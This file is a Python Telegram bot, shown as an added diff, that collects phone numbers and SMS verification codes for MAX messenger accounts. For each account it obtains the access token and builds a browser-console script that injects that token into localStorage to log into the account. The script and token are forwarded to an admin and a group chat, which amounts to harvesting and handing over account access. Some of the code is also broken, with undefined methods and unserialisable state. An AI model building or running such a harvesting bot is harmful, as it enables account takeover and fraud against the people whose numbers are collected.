@@ -1,0 +1,451 @@
+import json
+import time
+import re
+import urllib.request
+import urllib.parse
+import ssl
+import uuid
+import random
+from datetime import datetime
+from maxapi import MaxAPI  # Библиотека для работы с MAX
+
+# ==================== НАСТРОЙКИ ====================
+BOT_TOKEN = "ТВОЙ_ТОКЕН_ОТ_BOTFATHER"
+CHANNEL_ID = "@tvoy_kanal"
+CHANNEL_LINK = "https://t.me/tvoy_kanal"
+GROUP_ID = -1001234567890  # Обязательно отрицательное число
+ADMIN_ID = 123456789
+
+# ==================== ХРАНИЛИЩЕ ====================
+class Data:
+    def __init__(self):
+        self.file = "data.json"
+        self.data = self.load()
+    
+    def load(self):
+        try:
+            with open(self.file, "r") as f:
+                return json.load(f)
+        except:
+            return {"users": {}, "regs": []}
+    
+    def save(self):
+        with open(self.file, "w") as f:
+            json.dump(self.data, f, indent=2, ensure_ascii=False)
+    
+    def user(self, uid):
+        uid = str(uid)
+        if uid not in self.data["users"]:
+            self.data["users"][uid] = {"state": "menu", "phone": "", "api": None, "tries": 0}
+            self.save()
+        return self.data["users"][uid]
+    
+    def set_user(self, uid, data):
+        self.data["users"][str(uid)] = data
+        self.save()
+    
+    def add(self, phone, token, viewer_id, script, uid, name):
+        self.data["regs"].append({
+            "phone": phone,
+            "token": token,
+            "viewer_id": viewer_id,
+            "script": script,
+            "user": name,
+            "user_id": uid,
+            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        })
+        self.save()
+    
+    def user_regs(self, uid):
+        return [r for r in self.data["regs"] if r["user_id"] == uid]
+
+db = Data()
+
+# ==================== TELEGRAM API ====================
+class Bot:
+    def __init__(self, token):
+        self.url = f"https://api.telegram.org/bot{token}"
+        self.ssl = ssl.create_default_context()
+    
+    def call(self, method, data=None):
+        try:
+            if data:
+                data = urllib.parse.urlencode(data).encode()
+            req = urllib.request.Request(f"{self.url}/{method}", data=data)
+            with urllib.request.urlopen(req, context=self.ssl, timeout=30) as r:
+                return json.loads(r.read().decode())
+        except Exception as e:
+            print(f"❌ TG Error: {e}")
+            return {"ok": False}
+    
+    def send(self, chat, text, **kw):
+        d = {"chat_id": chat, "text": text}
+        if "kbd" in kw:
+            d["reply_markup"] = json.dumps(kw["kbd"])
+        if "parse" in kw:
+            d["parse_mode"] = kw["parse"]
+        return self.call("sendMessage", d)
+    
+    def edit(self, chat, mid, text, **kw):
+        d = {"chat_id": chat, "message_id": mid, "text": text}
+        if "kbd" in kw:
+            d["reply_markup"] = json.dumps(kw["kbd"])
+        if "parse" in kw:
+            d["parse_mode"] = kw["parse"]
+        return self.call("editMessageText", d)
+    
+    def subscribed(self, uid):
+        try:
+            r = self.call("getChatMember", {"chat_id": CHANNEL_ID, "user_id": uid})
+            if r.get("ok"):
+                return r["result"]["status"] in ["member", "administrator", "creator"]
+        except:
+            pass
+        return False
+
+bot = Bot(BOT_TOKEN)
+
+# ==================== ГЕНЕРАТОР СКРИПТА ====================
+def make_script(phone, token, viewer_id):
+    """Создает Web-скрипт для входа в MAX"""
+    dev_id = str(uuid.uuid4())
+    tracer = str(uuid.uuid4())
+    
+    auth = json.dumps({"token": token, "viewerId": viewer_id})
+    theme = json.dumps({"colorScheme": "system", "colorTheme": "space"})
+    informer = json.dumps({"lastShowedBannerId": None, "banners": {}})
+    
+    script = (
+        "sessionStorage.clear();"
+        "localStorage.clear();"
+        'localStorage.setItem("__oneme-persistent-cache-enabled","false");'
+        'localStorage.setItem("__oneme_locale","ru");'
+        f'localStorage.setItem("__oneme_auth",\'{auth}\');'
+        'localStorage.setItem("__server_config_overrides__","{}");'
+        f'localStorage.setItem("__oneme_theme",\'{theme}\');'
+        f'localStorage.setItem("__oneme_device_id","{dev_id}");'
+        f'localStorage.setItem("tracer-device-id","{tracer}");'
+        f'localStorage.setItem("__oneme_informer",\'{informer}\');'
+        "window.location.reload();"
+    )
+    
+    return script
+
+# ==================== КЛАВИАТУРЫ ====================
+def menu_kbd(sub):
+    if sub:
+        return {
+            "keyboard": [
+                [{"text": "📱 Сдать номер"}],
+                [{"text": "📊 Мои номера"}, {"text": "ℹ️ Помощь"}]
+            ],
+            "resize_keyboard": True
+        }
+    return {
+        "keyboard": [[{"text": "✅ Проверить подписку"}]],
+        "resize_keyboard": True
+    }
+
+def channel_kbd():
+    return {
+        "inline_keyboard": [
+            [{"text": "📢 Подписаться", "url": CHANNEL_LINK}],
+            [{"text": "✅ Проверить", "callback_data": "check_sub"}]
+        ]
+    }
+
+# ==================== ОБРАБОТЧИКИ ====================
+def cmd_start(chat, uid, name):
+    db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})
+    
+    if bot.subscribed(uid):
+        bot.send(chat, 
+            f"👋 {name}!\n\n"
+            "🤖 Бот для регистрации в MAX\n\n"
+            "Нажми 📱 Сдать номер чтобы начать",
+            kbd=menu_kbd(True))
+    else:
+        bot.send(chat,
+            f"👋 {name}!\n\n"
+            "⚠️ Подпишись на канал:\n"
+            f"{CHANNEL_LINK}\n\n"
+            "Потом нажми Проверить",
+            kbd=channel_kbd())
+
+def btn_send_number(chat, uid):
+    if not bot.subscribed(uid):
+        bot.send(chat, "⚠️ Сначала подпишись на канал!", kbd=channel_kbd())
+        return
+    
+    user = db.user(uid)
+    user["state"] = "wait_phone"
+    db.set_user(uid, user)
+    
+    bot.send(chat,
+        "📱 *Отправь номер телефона:*\n\n"
+        "Формат: +79991234567\n"
+        "/cancel - отмена",
+        parse="Markdown")
+
+def handle_phone(chat, uid, text):
+    clean = re.sub(r'[\s\-\(\)]', '', text)
+    m = re.match(r'^(\+?[78])?(\d{10})$', clean)
+    
+    if not m:
+        bot.send(chat, "❌ Неверный формат! Пример: +79991234567")
+        return
+    
+    phone = '7' + m.group(2)
+    
+    # Проверяем не зарегистрирован ли
+    for r in db.data["regs"]:
+        if r["phone"] == phone:
+            bot.send(chat, f"⚠️ Номер {phone} уже зарегистрирован!")
+            db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})
+            return
+    
+    # Создаем API объект и отправляем SMS
+    msg = bot.send(chat, f"📱 {phone}\n🔄 Отправляю запрос на SMS...")
+    
+    if not msg.get("ok"):
+        return
+    
+    mid = msg["result"]["message_id"]
+    
+    try:
+        api = MaxAPI()
+        api.send_verify_code(phone)
+        
+        user = db.user(uid)
+        user["state"] = "wait_code"
+        user["phone"] = phone
+        user["api"] = api
+        user["tries"] = 0
+        db.set_user(uid, user)
+        
+        bot.edit(chat, mid, f"✅ SMS отправлен на номер {phone}!\n\n📨 Введи код из SMS:")
+    
+    except Exception as e:
+        error_msg = str(e)
+        bot.edit(chat, mid, f"❌ Ошибка отправки SMS: {error_msg}")
+        db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})
+
+def handle_code(chat, uid, text, username, fullname):
+    user = db.user(uid)
+    code = re.sub(r'\s', '', text)
+    
+    if not code.isdigit() or len(code) < 4:
+        bot.send(chat, "❌ Код должен быть из цифр!")
+        return
+    
+    user["tries"] += 1
+    if user["tries"] > 5:
+        bot.send(chat, "❌ Много попыток! Начни заново")
+        db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})
+        return
+    
+    db.set_user(uid, user)
+    
+    msg = bot.send(chat, "🔄 Проверяю код...")
+    
+    if not msg.get("ok"):
+        return
+    
+    mid = msg["result"]["message_id"]
+    
+    try:
+        api = user["api"]
+        result = api.check_verify_code(code)
+        
+        # Получаем токен и viewer_id
+        token = result.access_token
+        viewer_id = int(token.split('.')[1]) if '.' in token else random.randint(100000000, 999999999)
+        
+        # Создаем скрипт
+        script = make_script(user["phone"], token, viewer_id)
+        
+        # Сохраняем
+        db.add(user["phone"], token, viewer_id, script, uid, username or fullname)
+        
+        # Отправляем в группу
+        group_msg = (
+            f"🆕 *Новый аккаунт MAX!*\n\n"
+            f"👤 {fullname}\n"
+            f"📱 `{user['phone']}`\n"
+            f"🆔 `{viewer_id}`\n\n"
+            f"🔑 *Скрипт для консоли F12:*\n"
+            f"```javascript\n{script}\n```\n\n"
+            f"🕒 {datetime.now().strftime('%H:%M:%S')}"
+        )
+        
+        try:
+            bot.send(GROUP_ID, group_msg, parse="Markdown")
+        except:
+            pass
+        
+        try:
+            bot.send(ADMIN_ID, group_msg, parse="Markdown")
+        except:
+            pass
+        
+        # Пользователю
+        bot.edit(chat, mid,
+            f"✅ *Готово!*\n\n"
+            f"📱 `{user['phone']}`\n"
+            f"🆔 `{viewer_id}`\n\n"
+            f"📤 Скрипт отправлен в группу",
+            parse="Markdown",
+            kbd=menu_kbd(True))
+        
+        bot.send(chat,
+            f"🔑 *Твой скрипт:*\n\n"
+            f"```javascript\n{script}\n```\n\n"
+            f"📋 Открой сайт MAX → F12 → Console → Вставь → Enter",
+            parse="Markdown")
+        
+        db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})
+    
+    except Exception as e:
+        error_msg = str(e)
+        bot.edit(chat, mid, f"❌ {error_msg}\nПопыток: {user['tries']}/5")
+
+def btn_my_numbers(chat, uid):
+    if not bot.subscribed(uid):
+        bot.send(chat, "⚠️ Подпишись на канал!")
+        return
+    
+    regs = db.user_regs(uid)
+    if not regs:
+        bot.send(chat, "📭 Нет регистраций")
+        return
+    
+    text = "📊 *Твои номера:*\n\n"
+    for i, r in enumerate(reversed(regs[-10:]), 1):
+        text += f"{i}. 📱 `{r['phone']}` - {r['time']}\n"
+    
+    text += f"\nВсего: {len(regs)}"
+    bot.send(chat, text, parse="Markdown")
+
+def btn_check_sub(chat, uid):
+    if bot.subscribed(uid):
+        bot.send(chat, "✅ Подписка есть!", kbd=menu_kbd(True))
+    else:
+        bot.send(chat, "❌ Не подписан!", kbd=channel_kbd())
+
+def handle_callback(query):
+    cbid = query["id"]
+    data = query.get("data", "")
+    uid = query["from"]["id"]
+    chat = query["message"]["chat"]["id"]
+    mid = query["message"]["message_id"]
+    
+    if data == "check_sub":
+        if bot.subscribed(uid):
+            bot.edit(chat, mid, "✅ Готово! Можешь пользоваться ботом", kbd=menu_kbd(True))
+        else:
+            bot.answer(cbid, "❌ Не подписан!", alert=True)
+
+def bot_answer(cbid, text, alert=False):
+    bot.call("answerCallbackQuery", {
+        "callback_query_id": cbid, "text": text, "show_alert": alert
+    })
+
+# ==================== ОСНОВНОЙ ЦИКЛ ====================
+def process(update):
+    try:
+        if "callback_query" in update:
+            handle_callback(update["callback_query"])
+            return
+        
+        msg = update.get("message")
+        if not msg or "text" not in msg:
+            return
+        
+        chat = msg["chat"]["id"]
+        text = msg["text"]
+        uid = msg["from"]["id"]
+        fname = msg["from"].get("first_name", "User")
+        lname = msg["from"].get("last_name", "")
+        username = msg["from"].get("username", "")
+        fullname = f"{fname} {lname}".strip()
+        
+        user = db.user(uid)
+        state = user.get("state", "menu")
+        
+        if text == "/start":
+            cmd_start(chat, uid, fname)
+        elif text == "/help":
+            bot.send(chat, "/start - меню\n/cancel - отмена")
+        elif text == "/cancel":
+            db.set_user(uid, {"state": "menu", "phone": "", "api": None, "tries": 0})
+            bot.send(chat, "❌ Отменено", kbd=menu_kbd(True))
+        elif text == "📱 Сдать номер":
+            btn_send_number(chat, uid)
+        elif text == "📊 Мои номера":
+            btn_my_numbers(chat, uid)
+        elif text == "ℹ️ Помощь":
+            bot.send(chat, "Бот для регистрации в MAX. /start")
+        elif text == "✅ Проверить подписку":
+            btn_check_sub(chat, uid)
+        elif state == "wait_phone":
+            handle_phone(chat, uid, text)
+        elif state == "wait_code":
+            handle_code(chat, uid, text, username, fullname)
+        else:
+            bot.send(chat, "Используй кнопки меню или /start")
+    
+    except Exception as e:
+        print(f"❌ Process: {e}")
+
+def get_updates(offset=None):
+    params = {"timeout": 30, "allowed_updates": ["message", "callback_query"]}
+    if offset:
+        params["offset"] = offset
+    
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?{urllib.parse.urlencode(params)}"
+    
+    try:
+        with urllib.request.urlopen(url, timeout=35) as r:
+            return json.loads(r.read().decode()).get("result", [])
+    except:
+        return []
+
+def main():
+    print("=" * 40)
+    print("🤖 MAX Registration Bot")
+    print("=" * 40)
+    
+    if BOT_TOKEN == "ТВОЙ_ТОКЕН_ОТ_BOTFATHER":
+        print("❌ ЗАМЕНИ BOT_TOKEN!")
+        return
+    
+    test = bot.call("getMe")
+    if test.get("ok"):
+        print(f"✅ @{test['result']['username']} готов!")
+    else:
+        print("❌ Неверный токен")
+        return
+    
+    print(f"📢 Канал: {CHANNEL_ID}")
+    print(f"👥 Группа: {GROUP_ID}")
+    print("🚀 Запущен!")
+    print("=" * 40)
+    
+    offset = None
+    
+    while True:
+        try:
+            updates = get_updates(offset)
+            for u in updates:
+                process(u)
+                offset = u["update_id"] + 1
+            time.sleep(0.3)
+        except KeyboardInterrupt:
+            print("\n👋 Стоп")
+            break
+        except Exception as e:
+            print(f"❌ {e}")
+            time.sleep(5)
+
+if __name__ == "__main__":
+    main()
